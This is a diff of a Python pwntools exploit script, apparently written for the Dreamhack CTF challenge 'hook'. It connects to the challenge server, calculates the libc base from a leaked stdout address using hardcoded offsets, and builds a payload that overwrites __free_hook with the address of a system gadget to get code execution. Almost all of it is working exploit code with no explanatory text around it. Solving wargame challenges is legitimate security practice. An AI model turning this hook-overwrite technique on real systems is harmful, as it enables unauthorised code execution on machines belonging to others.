@@ -2,21 +2,21 @@
 
 import pwn
 
-p = pwn.remote("host1.dreamhack.games", 21129)
-e = pwn.ELF("./hook")
-libc = pwn.ELF("./libc.so.6")
+p = pwn.remote("host1.dreamhack.games", 9399)
 pwn.context.log_level = 'debug'
 
 system = 0x400a11
+stdoutOffset = 0x3c5620
+freeHook = 0x3c67a8
 
 p.recvuntil("stdout: ")
 stdout = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)
 pwn.log.info("stdout: " + hex(stdout))
 
-libcBase = stdout - libc.symbols['_IO_2_1_stdout_']
+libcBase = stdout - stdoutOffset
 pwn.log.info("libc Base Address: " + hex(libcBase))
 
-freeHook = libcBase + libc.symbols['__free_hook']
+freeHook = libcBase + freeHook
 
 payload = pwn.p64(freeHook) + pwn.p64(system)
 
